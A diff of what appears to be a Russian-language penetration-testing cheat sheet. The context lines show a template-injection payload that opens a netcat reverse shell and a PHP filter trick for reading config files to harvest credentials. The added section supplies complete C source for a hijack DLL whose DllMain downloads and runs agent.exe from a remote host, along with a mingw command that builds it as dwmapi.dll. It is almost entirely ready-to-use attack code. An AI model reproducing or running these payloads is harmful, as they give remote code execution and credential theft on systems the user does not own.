@@ -79,3 +79,33 @@ ${T(java.lang.Runtime).getRuntime().exec("nc -e /bin/sh 192.168.1.100 4444")}
 http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
 ```
 Декодируем данные, находим креды, используем их в дальнейшем
+
+** DLL Hijacking
+
+Код:
+
+```
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+ switch(dwReason){
+ case DLL_PROCESS_ATTACH:
+ system("cmd /c powershell wget http://10.0.0.222:8080/agent.ex
+e -O C:\\Windows\\Tasks\\agent.exe ; cmd /c C:\\Windows\\Tasks\\agent.exe"
+);
+ break;
+ case DLL_PROCESS_DETACH:
+ break;
+ case DLL_THREAD_ATTACH:
+ break;
+ case DLL_THREAD_DETACH:
+ break;
+ }
+ return TRUE;
+}
+```
+
+Сборка:
+
+```
+x86_64-w64-mingw32-gcc -o dwmapi.dll -shared source.c
+```
